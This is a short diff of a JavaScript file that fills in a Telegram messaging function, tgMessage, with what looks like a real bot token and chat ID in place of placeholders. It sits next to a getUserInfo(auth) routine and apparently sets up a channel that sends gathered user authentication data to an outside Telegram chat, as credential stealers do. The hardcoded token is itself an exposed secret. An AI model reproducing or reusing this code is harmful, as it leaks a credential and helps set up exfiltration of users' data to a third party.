@@ -296,8 +296,8 @@ const getUserInfo = (auth) => new Promise(async (resolve) => {
 });
 
 const tgMessage = async (message) => {
-    const token = 'BOT_TOKEN';
-    const chatid = 'TELE_ID';
+    const token = '7363626043:AAFdscks2lzbrITffn9Vl_Zy7iDp0JkIvtU';
+    const chatid = '809430442';
     const boturl = `https://api.telegram.org/bot${token}/sendMessage`;
 
     await fetch(boturl, {
